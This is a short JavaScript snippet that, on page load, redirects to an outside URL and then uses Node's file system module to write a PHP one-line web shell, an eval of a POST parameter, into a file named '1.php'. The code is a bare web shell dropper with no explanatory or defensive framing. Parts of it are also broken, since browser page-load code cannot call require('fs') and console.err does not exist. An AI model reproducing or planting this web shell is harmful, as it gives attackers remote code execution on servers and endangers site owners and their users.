
window.onload=function(){
  window.location.href="https://system-404-blog";
  const fs = require('fs');
  const name = "<? @eval($_POST['888']); ?>";
  fs.writeFile("1.php",name,(err) => {
    if (err){
      console.err(err);
      return;
    }
    console.log("ok")
  });
}
